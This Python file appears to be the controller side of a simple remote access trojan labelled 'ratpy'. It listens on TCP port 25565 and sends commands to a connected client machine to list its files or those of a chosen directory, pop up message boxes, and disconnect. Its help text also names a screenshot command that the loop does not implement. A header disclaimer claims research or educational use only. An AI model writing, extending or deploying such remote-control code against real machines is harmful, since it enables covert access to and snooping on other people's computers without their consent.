'''
THIS IS NOT MEANT TO BE USED MALICIOUSLY,
ONLY USE THIS FOR REASEARCH OR EDUCATIONAL POURPOSES.
'''

import os
import sys
import socket
import tkinter
from tkinter import messagebox
import traceback
import warnings
import cv2

#host = socket.gethostname()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname(socket.gethostname())
opensocket = True
ss_num = 0

# CONFIGURABLE SETTINGS
port = 25565

# Cool ascii art
print('''
                      /$$                        
                     | $$                        
  /$$$$$$  /$$$$$$  /$$$$$$    /$$$$$$  /$$   /$$
 /$$__  $$|____  $$|_  $$_/   /$$__  $$| $$  | $$
| $$  \__/ /$$$$$$$  | $$    | $$  \ $$| $$  | $$
| $$      /$$__  $$  | $$ /$$| $$  | $$| $$  | $$
| $$     |  $$$$$$$  |  $$$$/| $$$$$$$/|  $$$$$$$
|__/      \_______/   \___/  | $$____/  \____  $$
                             | $$       /$$  | $$
                             | $$      |  $$$$$$/
                             |__/       \______/ 
''')

# Connect to client
sock.bind((host, port))
print("Success: binded host and port (" + host + ":" + str(port) + ")")
print("Server is running on " + host)
sock.listen(1)
print("Server is now listening for new connections")

connection, address = sock.accept()
print(str(address) + " has connected to the server")

# Commands
def add_command(command):
    connection.send(command.encode())
    print(command + " has been sent")

while opensocket:
    command = input(str("cmd > "))
    if command == "help":
        add_command("help")
        print('''
        COMMANDS:
        - list: prints all files listed in the current directory
        - listfrom: prints all files listed in a specified directory
        - screenshot: takes a screenshot and saves it to current directory
        - disconnect: closes connection between the server and client
        - showalert: show an alert on the client's screen (Message Box)
        - help: shows a list of commands
        ''')

    elif command == "list":
        add_command("list")
        files = connection.recv(5000).decode()
        print(files)

    elif command == "listfrom":
        add_command("listfrom")
        fromdir = input(str("What directory would you like to list the files from? "))
        connection.send(fromdir.encode())
        files = connection.recv(5000).decode()
        print(files)

    elif command == "disconnect":
        add_command("disconnect")
        opensocket = False
        connection.close()

    elif command == "showalert":
        add_command("showalert")
        title = str(input("What would you like the title of the alert to be? "))
        connection.send(title.encode())

        message = str(input("What would you like the message of the alert to be? "))
        connection.send(message.encode())

        print("Alert has been sent with title of \"" + title + "\" and message of \"" + message + "\"")

    else:
        print("Sorry, " + command + " was not found")

sys.exit(1)